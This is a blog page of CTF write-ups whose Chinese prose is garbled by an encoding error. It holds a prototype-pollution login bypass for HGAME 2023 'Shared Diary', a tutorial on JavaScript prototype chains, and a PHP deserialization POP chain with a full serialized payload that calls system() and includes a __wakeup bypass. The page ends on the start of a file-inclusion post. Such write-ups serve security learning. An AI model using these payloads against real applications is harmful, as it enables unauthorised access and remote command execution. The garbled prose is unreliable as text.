<p>è¿™é“é¢˜æ˜¯ [HGAME 2023 week4]Shared Diary ï¼Œè‡ªå¸¦æºç ï¼Œç™»å…¥ç½‘ç«™åæ˜¯ç”¨æˆ·åï¼Œå¯†ç è¾“å…¥ï¼ˆè™½ç„¶æ²¡è§è¿‡å‡ é“é¢˜ï¼Œä½†å¥½åƒè§åˆ°çš„æ¯ä¸ªæ±¡æŸ“éƒ½æ˜¯è¿™ä¹ˆä¸ªç•Œé¢ï¼‰</p>
<p>æ—¢ç„¶çŸ¥é“æ˜¯åŸå‹é“¾æ±¡æŸ“é¢˜å‹ï¼Œç›´æ¥æ‰¾æºä»£ç é‡Œé¢æ¼æ´æ˜“å‘ç°çš„mergeï¼ˆï¼‰éƒ¨åˆ†</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function merge(target, source) &#123;</span><br><span class="line">    for (let key in source) &#123;</span><br><span class="line">        // Prevent prototype pollution</span><br><span class="line">        if (key === &#x27;__proto__&#x27;) &#123;</span><br><span class="line">            throw new Error(&quot;Detected Prototype Pollution&quot;)</span><br><span class="line">        &#125;</span><br><span class="line">        if (key in source &amp;&amp; key in target) &#123;</span><br><span class="line">            merge(target[key], source[key])</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°æŠŠâ€™<strong>ptoto</strong>â€˜banæ‰äº†ï¼Œä½†æ˜¯å­˜åœ¨å¹³æ›¿prototypeï¼Œconstructor</p>
<p>çœ‹åé¢éƒ¨åˆ†ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> if (user.password=== &quot;testpassword&quot;) &#123;</span><br><span class="line">            user.role = &#x27;admin&#x27;</span><br><span class="line">        &#125;</span><br><span class="line">        if (user.role === &#x27;admin&#x27;) &#123;</span><br><span class="line">            req.session.role = &#x27;admin&#x27;</span><br><span class="line">            return res.redirect(&#x27;/&#x27;)</span><br><span class="line">        &#125;else &#123;</span><br><span class="line">            return res.render(&quot;login&quot;, &#123;message: &quot;Login as admin or don&#x27;t touch my shared diary!&quot;&#125;)</span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">    res.render(&#x27;login&#x27;, &#123;message: &quot;&quot;&#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬éœ€è¦è®©user.role&#x3D;&#x3D;&#x3D;admin</p>
<p>ç›´æ¥æŠ“åŒ…æ›¿æ¢payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;constructor&quot;: &#123;&quot;prototype&quot;: &#123;&quot;role&quot;: &quot;admin&quot;&#125;&#125;,&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;admin&quot;&#125; </span><br></pre></td></tr></table></figure>

<p>è®°å¾—æŠŠè¯»å–æ ¼å¼æ”¹æˆjson</p>
<p>ç„¶åå°±åˆ°ç¬¬äºŒéƒ¨åˆ†äº†ï¼Œè¿™ä¸ªéƒ¨åˆ†è¿˜æ²¡äº†è§£è¿‡ï¼Œæœªå®Œå¾…ç»­</p>
<p><img src="/" alt="/images/6.png"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/03/04/phototype-1/" data-id="clto5uld90003twb559fqg18b" data-title="phototype_1" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-phototype" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/03/03/phototype/" class="article-date">
  <time class="dt-published" datetime="2024-03-03T06:37:03.000Z" itemprop="datePublished">2024-03-03</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/03/03/phototype/">phototype</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p><strong>åŸå‹</strong></p>
<p>åœ¨jsä¸­ï¼Œæ¯ä¸€ä¸ªå‡½æ•°ç±»å‹çš„æ•°æ®ï¼Œéƒ½æœ‰ä¸€ä¸ªå«åšprototypeçš„å±æ€§ï¼Œè¿™ä¸ªå±æ€§æŒ‡å‘çš„æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œå°±æ˜¯æ‰€è°“çš„åŸå‹å¯¹è±¡ã€‚</p>
<p>å¯¹äºåŸå‹å¯¹è±¡æ¥è¯´ï¼Œå®ƒæœ‰ä¸ªconstructorå±æ€§ï¼ŒæŒ‡å‘å®ƒçš„æ„é€ å‡½æ•°ã€‚ </p>
<p>é‚£ä¹ˆè¿™ä¸ªåŸå‹å¯¹è±¡æœ‰ä»€ä¹ˆç”¨å‘¢ï¼Ÿæœ€ä¸»è¦çš„ä½œç”¨å°±æ˜¯ç”¨æ¥å­˜æ”¾å®ä¾‹å¯¹è±¡çš„å…¬æœ‰å±æ€§å’Œå…¬æœ‰æ–¹æ³•ã€‚ </p>
<p>å¦‚æœæŠŠæ–¹æ³•æ”¾åœ¨æ„é€ å‡½æ•°é‡Œï¼Œé‚£æ¯åˆ›å»ºä¸€ä¸ªå®ä¾‹ï¼Œå°±ä¼šé‡å¤åˆ›å»ºä¸€æ¬¡ç›¸åŒçš„å±æ€§å’Œæ–¹æ³•ï¼Œæ˜¾å¾—æœ‰äº›æµªè´¹ã€‚è¿™æ—¶å€™ï¼Œå¦‚æœæŠŠè¿™äº›å…¬æœ‰çš„å±æ€§å’Œæ–¹æ³•æ”¾åœ¨åŸå‹å¯¹è±¡é‡Œå…±äº«ï¼Œå°±ä¼šå¥½å¾ˆå¤šã€‚ </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">function Person(name, age) &#123;</span><br><span class="line">    this.name = name;</span><br><span class="line">    this.age = age;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Person.prototype.species = &#x27;äººç±»&#x27;;</span><br><span class="line">Person.prototype.say = function () &#123;</span><br><span class="line">    console.log(&quot;Hello&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">let per1 = new Person(&#x27;xiaoming&#x27;, 20);</span><br><span class="line">let per2 = new Person(&#x27;xiaohong&#x27;, 19);</span><br><span class="line"></span><br><span class="line">console.log(per1.species); // äººç±» </span><br><span class="line">console.log(per2.species); // äººç±»</span><br><span class="line"></span><br><span class="line">per1.say(); // Hello</span><br><span class="line">per2.say(); // Hello</span><br></pre></td></tr></table></figure>

<p>å¯æ˜¯è¿™é‡Œçš„specieså±æ€§å’Œsayæ–¹æ³•ä¸æ˜¯å®ä¾‹å¯¹è±¡è‡ªå·±çš„ï¼Œä¸ºä»€ä¹ˆå¯ä»¥ç›´æ¥ç”¨ç‚¹è¿ç®—ç¬¦è®¿é—®ï¼Ÿè¿™æ˜¯å› ä¸ºåœ¨jsä¸­ï¼Œå¯¹è±¡å¦‚æœåœ¨è‡ªå·±çš„è¿™é‡Œæ‰¾ä¸åˆ°å¯¹åº”çš„å±æ€§æˆ–è€…æ–¹æ³•ï¼Œå°±ä¼šæŸ¥çœ‹æ„é€ å‡½æ•°çš„åŸå‹å¯¹è±¡ï¼Œå¦‚æœä¸Šé¢æœ‰è¿™ä¸ªå±æ€§æˆ–æ–¹æ³•ï¼Œå°±ä¼šè¿”å›å±æ€§å€¼æˆ–è°ƒç”¨æ–¹æ³•ã€‚æ‰€ä»¥æœ‰æ—¶å€™ï¼Œæˆ‘ä»¬ä¼šç”¨per1.constructoræŸ¥çœ‹å¯¹è±¡çš„æ„é€ å‡½æ•°ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">console.log(per1.constructor); // Person()</span><br></pre></td></tr></table></figure>

<hr>
<ol>
<li><strong>æ˜¾ç¤ºåŸå‹</strong></li>
</ol>
<p>æ˜¾ç¤ºåŸå‹å°±æ˜¯åˆ©ç”¨prototypeå±æ€§æŸ¥æ‰¾åŸå‹ï¼Œåªæ˜¯è¿™ä¸ªæ˜¯å‡½æ•°ç±»å‹æ•°æ®çš„å±æ€§ã€‚<br>2. <strong>éšå¼åŸå‹</strong></p>
<p>éšå¼åŸå‹æ˜¯åˆ©ç”¨__proto__å±æ€§æŸ¥æ‰¾åŸå‹ï¼Œè¿™ä¸ªå±æ€§æŒ‡å‘å½“å‰å¯¹è±¡çš„æ„é€ å‡½æ•°çš„åŸå‹å¯¹è±¡ï¼Œè¿™ä¸ªå±æ€§æ˜¯å¯¹è±¡ç±»å‹æ•°æ®çš„å±æ€§ï¼Œæ‰€ä»¥å¯ä»¥åœ¨å®ä¾‹å¯¹è±¡ä¸Šé¢ä½¿ç”¨ï¼š</p>
<ol start="3">
<li><strong>åŸå‹é“¾</strong></li>
</ol>
<p>æ—¢ç„¶è¿™ä¸ªæ˜¯å¯¹è±¡ç±»å‹çš„å±æ€§ï¼Œè€ŒåŸå‹å¯¹è±¡ä¹Ÿæ˜¯å¯¹è±¡ï¼Œé‚£ä¹ˆåŸå‹å¯¹è±¡å°±ä¹Ÿæœ‰è¿™ä¸ªå±æ€§ï¼Œä½†æ˜¯åŸå‹å¯¹è±¡çš„__proto__åˆæ˜¯æŒ‡å‘å“ªå‘¢ï¼Ÿ</p>
<p>æˆ‘ä»¬æ¥åˆ†æä¸€ä¸‹ï¼Œæ—¢ç„¶åŸå‹å¯¹è±¡ä¹Ÿæ˜¯å¯¹è±¡ï¼Œé‚£æˆ‘ä»¬åªè¦æ‰¾åˆ°å¯¹è±¡çš„æ„é€ å‡½æ•°å°±èƒ½çŸ¥é“__proto__çš„æŒ‡å‘äº†ã€‚è€Œjsä¸­ï¼Œå¯¹è±¡çš„æ„é€ å‡½æ•°å°±æ˜¯Object()ï¼ˆ åœ¨JavaScriptä¸­ï¼Œæ‰€æœ‰çš„å¯¹è±¡å®é™…ä¸Šéƒ½æ˜¯ä» Object å¯¹è±¡ç»§æ‰¿è€Œæ¥çš„ã€‚Object æ˜¯ JavaScript ä¸­çš„å†…ç½®æ„é€ å‡½æ•°ï¼Œå®ƒæ˜¯æ‰€æœ‰å¯¹è±¡çš„åŸºç±» ï¼‰æ‰€ä»¥å¯¹è±¡çš„åŸå‹å¯¹è±¡ï¼Œå°±æ˜¯Object.prototypeã€‚æ—¢ç„¶åŸå‹å¯¹è±¡ä¹Ÿæ˜¯å¯¹è±¡ï¼Œé‚£åŸå‹å¯¹è±¡çš„åŸå‹å¯¹è±¡ï¼Œå°±ä¹Ÿæ˜¯Object.prototypeã€‚ä¸è¿‡Object.prototypeè¿™ä¸ªæ¯”è¾ƒç‰¹æ®Šï¼Œå®ƒæ²¡æœ‰ä¸Šä¸€å±‚çš„åŸå‹å¯¹è±¡ï¼Œæˆ–è€…è¯´æ˜¯å®ƒçš„__proto__æŒ‡å‘çš„æ˜¯nullã€‚</p>
<p>åˆ°è¿™é‡Œï¼Œå°±å¯ä»¥å›ç­”å‰é¢é‚£ä¸ªé—®é¢˜äº†ï¼Œå¦‚æœæŸä¸ªå¯¹è±¡æŸ¥æ‰¾å±æ€§ï¼Œè‡ªå·±å’ŒåŸå‹å¯¹è±¡ä¸Šéƒ½æ²¡æœ‰ï¼Œé‚£å°±ä¼šç»§ç»­å¾€åŸå‹å¯¹è±¡çš„åŸå‹å¯¹è±¡ä¸Šå»æ‰¾ï¼Œè¿™ä¸ªä¾‹å­é‡Œå°±æ˜¯Object.prototypeï¼Œè¿™é‡Œå°±æ˜¯æŸ¥æ‰¾çš„ç»ˆç‚¹ç«™äº†ï¼Œåœ¨è¿™é‡Œæ‰¾ä¸åˆ°ï¼Œå°±æ²¡æœ‰æ›´ä¸Šä¸€å±‚äº†ï¼ˆnullé‡Œé¢å•¥ä¹Ÿæ²¡æœ‰ï¼‰ï¼Œç›´æ¥è¿”å›undefinedã€‚</p>
<p>å¯ä»¥çœ‹å‡ºï¼Œæ•´ä¸ªæŸ¥æ‰¾è¿‡ç¨‹éƒ½æ˜¯é¡ºç€_proto__å±æ€§ï¼Œä¸€æ­¥ä¸€æ­¥å¾€ä¸ŠæŸ¥æ‰¾ï¼Œå½¢æˆäº†åƒé“¾æ¡ä¸€æ ·çš„ç»“æ„ï¼Œè¿™ä¸ªç»“æ„ï¼Œå°±æ˜¯åŸå‹é“¾ã€‚æ‰€ä»¥ï¼ŒåŸå‹é“¾ä¹Ÿå«ä½œéšå¼åŸå‹é“¾ã€‚</p>
<p>æ­£æ˜¯å› ä¸ºè¿™ä¸ªåŸå› ï¼Œæˆ‘ä»¬åœ¨åˆ›å»ºå¯¹è±¡ã€æ•°ç»„ã€å‡½æ•°ç­‰ç­‰æ•°æ®çš„æ—¶å€™ï¼Œéƒ½è‡ªå¸¦ä¸€äº›å±æ€§å’Œæ–¹æ³•ï¼Œè¿™äº›å±æ€§å’Œæ–¹æ³•æ˜¯åœ¨å®ƒä»¬çš„åŸå‹ä¸Šé¢ä¿å­˜ç€ï¼Œæ‰€ä»¥å®ƒä»¬è‡ªåˆ›å»ºèµ·å°±å¯ä»¥ç›´æ¥ä½¿ç”¨é‚£äº›å±æ€§å’Œæ–¹æ³•ã€‚</p>
<p><strong>å‡½æ•°ä¹Ÿæ˜¯ä¸€ç§å¯¹è±¡</strong></p>
<p>å‡½æ•°åœ¨jsä¸­ï¼Œä¹Ÿç®—æ˜¯ä¸€ç§ç‰¹æ®Šçš„å¯¹è±¡ï¼Œæ‰€ä»¥ï¼Œå¯ä»¥æƒ³åˆ°çš„æ˜¯ï¼Œå‡½æ•°æ˜¯ä¸æ˜¯ä¹Ÿæœ‰ä¸€ä¸ª__proto__å±æ€§ï¼Ÿç­”æ¡ˆæ˜¯è‚¯å®šçš„ï¼Œæ—¢ç„¶å¦‚æ­¤ï¼Œé‚£å°±æŒ‰ä¸Šé¢çš„æ€è·¯ï¼Œå…ˆæ¥æ‰¾æ‰¾å‡½æ•°å¯¹è±¡çš„æ„é€ å‡½æ•°ã€‚</p>
<p>åœ¨jsä¸­ï¼Œæ‰€æœ‰å‡½æ•°éƒ½å¯ä»¥çœ‹åšæ˜¯Function()çš„å®ä¾‹ï¼Œè€ŒPerson()å’ŒObject()éƒ½æ˜¯å‡½æ•°ï¼Œæ‰€ä»¥å®ƒä»¬çš„æ„é€ å‡½æ•°å°±æ˜¯Function()ã€‚Function()æœ¬èº«ä¹Ÿæ˜¯å‡½æ•°ï¼Œæ‰€ä»¥Function()ä¹Ÿæ˜¯è‡ªå·±çš„å®ä¾‹ã€‚</p>
<p><img src="/images/5.png"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/03/03/phototype/" data-id="clto5ulda0005twb569fp8ikl" data-title="phototype" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-n-ez-unserilize" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/03/03/n-ez-unserilize/" class="article-date">
  <time class="dt-published" datetime="2024-03-03T05:17:45.000Z" itemprop="datePublished">2024-03-03</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/03/03/n-ez-unserilize/">n_ez_unserilize</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">show_source(__FILE__);</span><br><span class="line"></span><br><span class="line">class Cache &#123;</span><br><span class="line">    public $key;</span><br><span class="line">    public $value;</span><br><span class="line">    public $expired;</span><br><span class="line">    public $helper;</span><br><span class="line"></span><br><span class="line">    public function __construct($key, $value, $helper) &#123;</span><br><span class="line">        $this-&gt;key = $key;</span><br><span class="line">        $this-&gt;value = $value;</span><br><span class="line">        $this-&gt;helper = $helper;</span><br><span class="line"></span><br><span class="line">        $this-&gt;expired = False;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __wakeup() &#123;</span><br><span class="line">        $this-&gt;expired = False;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function expired() &#123;</span><br><span class="line">        if ($this-&gt;expired) &#123;</span><br><span class="line">            $this-&gt;helper-&gt;clean($this-&gt;key);</span><br><span class="line">            return True;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return False;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Storage &#123;</span><br><span class="line">    public $store;</span><br><span class="line"></span><br><span class="line">    public function __construct() &#123;</span><br><span class="line">        $this-&gt;store = array();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    public function __set($name, $value) &#123;</span><br><span class="line">        if (!$this-&gt;store) &#123;</span><br><span class="line">            $this-&gt;store = array();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (!$value-&gt;expired()) &#123;</span><br><span class="line">            $this-&gt;store[$name] = $value;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __get($name) &#123;</span><br><span class="line">        return $this-&gt;data[$name];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Helper &#123;</span><br><span class="line">    public $funcs;</span><br><span class="line"></span><br><span class="line">    public function __construct($funcs) &#123;</span><br><span class="line">        $this-&gt;funcs = $funcs;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __call($name, $args) &#123;</span><br><span class="line">        $this-&gt;funcs[$name](...$args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class DataObject &#123;</span><br><span class="line">    public $storage;</span><br><span class="line">    public $data;</span><br><span class="line"></span><br><span class="line">    public function __destruct() &#123;</span><br><span class="line">        foreach ($this-&gt;data as $key =&gt; $value) &#123;</span><br><span class="line">            $this-&gt;storage-&gt;$key = $value;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;u&#x27;])) &#123;</span><br><span class="line">    unserialize($_GET[&#x27;u&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>å…ˆç»Ÿè®¡ä¸€ä¸‹é‡Œé¢ç”¨åˆ°çš„é­”æœ¯æ–¹æ³•</p>
<ol>
<li><p>__construct()</p>
</li>
<li><p>__destruct()</p>
</li>
<li><p>__wakeup()</p>
</li>
<li><p>__get()</p>
</li>
<li><p>__set()</p>
</li>
<li><p>__call()</p>
<p>å†çœ‹ä¸€çœ¼å±æ€§ï¼Œéƒ½æ˜¯public</p>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (isset($_GET[&#x27;u&#x27;])) &#123;</span><br><span class="line">    unserialize($_GET[&#x27;u&#x27;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¦ä¹ˆä»wakeupå¼€å§‹ï¼Œè¦ä¹ˆä»constructå¼€å§‹ï¼Œçœ‹ä¸‹å†…å®¹ï¼Œæ˜¯åè€…ï¼ŒæŠŠ <code>DataObject</code> è®°å½•ä¸º1å·</p>
<p>ä» <code>Cache</code> å¼€å§‹çœ‹èµ·ï¼Œå‘ç° <code>$this-&gt;helper-&gt;clean($this-&gt;key);</code> </p>
<p>å¯ä»¥è§¦å‘__call()</p>
<p>çœ‹ä¸€ä¸‹__call()å†…å®¹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;funcs[$name](...$args);</span><br></pre></td></tr></table></figure>

<p>æœäº†ä¸€ä¸‹ï¼Œè¿™å¥æ˜¯å¯å˜å‡½æ•°è°ƒç”¨è¯­æ³•ï¼Œç¬¬ä¸€æ¬¡é‡åˆ°å¯å˜å‡½æ•°è°ƒç”¨ï¼Œè¿˜ä¸å¤ªä¼šç”¨ï¼Œä¸è¿‡æ—¢ç„¶æ˜¯è°ƒç”¨å°±æ’åœ¨æœ€åä¸€æ­¥<br>é‚£ä¹ˆ<code>Cache</code>å®šä¸ºå€’æ•°ç¬¬äºŒæ­¥</p>
<p>å›æ¥çœ‹<code>DataObject</code>ï¼Œé‡Œé¢å­˜åœ¨ä¸€ä¸ªèµ‹å€¼$keyçš„æ“ä½œï¼Œ <code>$this-&gt;storage-&gt;$key</code> æˆå‘˜å‘½åæ˜¯ä¸ªçº¿ç´¢ï¼Œæ­£å¥½èƒ½è·Ÿ <code>Storage</code> è”ç³»èµ·æ¥ï¼Œï¼ˆä»£ç é‡ŒCacheé‡Œé¢ä¹Ÿå­˜åœ¨$key,ä¸è¿‡__constructä¼šèµ‹å€¼ï¼‰ï¼Œè§¦å‘setæ–¹æ³•</p>
<p>ä»£ç é‡Œå­˜åœ¨ä¸€ä¸ªwakeupæ–¹æ³•ï¼Œå…¶æ–¹æ³•ä¼šä½¿åé¢çš„iåˆ¤æ–­ä¸æˆç«‹ï¼Œä¹Ÿå°±æ— æ³•è°ƒç”¨cleanæ–¹æ³•ï¼Œè¿™ä¸€ç‚¹éœ€è¦wakeupç»•è¿‡</p>
<hr>
<p>é€»è¾‘é¡ºåºæ¸…æ¥šäº†ï¼Œä»æœ€åä¸€æ­¥çœ‹èµ·  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å½“è°ƒç”¨ä¸€ä¸ªå¯¹è±¡ä¸­ä¸å­˜åœ¨çš„æ–¹æ³•æ—¶ï¼Œä¼šè‡ªåŠ¨è§¦å‘`__call()`æ–¹æ³•ã€‚åœ¨è¿™é‡Œï¼Œ`__call()`æ–¹æ³•æ¥å—ä¸¤ä¸ªå‚æ•°ï¼šnameè¡¨ç¤ºè°ƒç”¨çš„æ–¹æ³•åï¼Œnameè¡¨ç¤ºè°ƒç”¨çš„æ–¹æ³•åï¼Œargsè¡¨ç¤ºä¼ é€’ç»™è¯¥æ–¹æ³•çš„å‚æ•°æ•°ç»„ã€‚</span><br></pre></td></tr></table></figure>

<p>ä¹Ÿå°±æ˜¯è¯´ç›®æ ‡è¯­å¥åœ¨æ•°ç»„é‡Œé¢é”®å€¼ä¸ºclean</p>
<p>$helper&#x3D;new Helper();</p>
<p>$helper-&gt;funcs&#x3D;array(â€˜cleanâ€™&#x3D;&gt;â€™systemâ€™);</p>
<hr>
<p>ä¹‹åæ˜¯cacheéƒ¨åˆ†</p>
<p>$cache&#x3D;new Cache();</p>
<p>$cache-&gt;helper&#x3D;$helper;</p>
<p>$cache-&gt;expired&#x3D;True;</p>
<p>$cache-&gt;key&#x3D;â€™php -r â€œphpinfo();â€â€˜;</p>
<p>ç¬¬ä¸‰è¡Œæ˜¯ä¸ºäº†é€šè¿‡ifåˆ¤æ–­ä»è€Œè§¦å‘cleanæ–¹æ³•</p>
<hr>
<p>å†ä¹‹åæ˜¯</p>
<p>$storage&#x3D;new Storage();</p>
<p>$dataObject&#x3D;new DataObject();</p>
<p>$dataObject-&gt;data&#x3D;array(â€˜keyâ€™&#x3D;&gt;$cache);</p>
<p>$dataObject-&gt;storage&#x3D;$storage;</p>
<hr>
<p>æœ€æœ€ååˆ«å¿˜äº†wakeupçš„ç»•è¿‡ï¼Œæ–¹æ³•æ˜¯ä½¿åºåˆ—åŒ–ä¹‹åè¡¨ç¤ºæˆå‘˜æ•°é‡çš„å€¼å¤§äºå®é™…çš„æˆå‘˜æ•°é‡</p>
<p>å…·ä½“æ¯”è¾ƒå¯ä»¥çœ‹ä¸€ä¸‹åé¢popé“¾è·‘å‡ºæ¥çš„å’Œpayloadçš„åŒºåˆ«</p>
<p><img src="/images/3.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?u=O:10:&quot;DataObject&quot;:2:&#123;s:7:&quot;storage&quot;;O:7:&quot;Storage&quot;:1:&#123;s:5:&quot;store&quot;;N;&#125;s:4:&quot;data&quot;;a:1:&#123;s:3:&quot;key&quot;;O:5:&quot;Cache&quot;:66:&#123;s:3:&quot;key&quot;;s:19:&quot;php -r &quot;phpinfo();&quot;&quot;;s:5:&quot;value&quot;;N;s:7:&quot;expired&quot;;b:1;s:6:&quot;helper&quot;;O:6:&quot;Helper&quot;:1:&#123;s:5:&quot;funcs&quot;;a:1:&#123;s:5:&quot;clean&quot;;s:6:&quot;system&quot;;&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/images/3.png"></p>
<p>æœ€åå†æ”¾ä¸€ä¸‹é€šå…³flag</p>
<p><img src="/images/2.png"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/03/03/n-ez-unserilize/" data-id="clto5uld80001twb589190ssm" data-title="n_ez_unserilize" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-æ–‡ä»¶ä¸Šä¼ " class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/02/29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="article-date">
  <time class="dt-published" datetime="2024-02-29T07:33:02.000Z" itemprop="datePublished">2024-02-29</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/02/29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">æ–‡ä»¶ä¸Šä¼ </a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p><strong>æ–‡ä»¶åŒ…å«æ¼æ´</strong></p>
<p>ç¨‹åºå¼€å‘äººå‘˜é€šå¸¸ä¼šæŠŠå¯é‡å¤ä½¿ç”¨çš„å‡½æ•°å†™åˆ°å•ä¸ªæ–‡ä»¶ä¸­ï¼Œåœ¨ä½¿ç”¨æŸä¸ªå‡½æ•°çš„æ—¶å€™ï¼Œç›´æ¥è°ƒç”¨æ­¤æ–‡ä»¶ï¼Œæ— éœ€å†æ¬¡ç¼–å†™ï¼Œè¿™ç§è°ƒç”¨æ–‡ä»¶çš„è¿‡ç¨‹é€šå¸¸ç§°ä¸ºåŒ…å« </p>
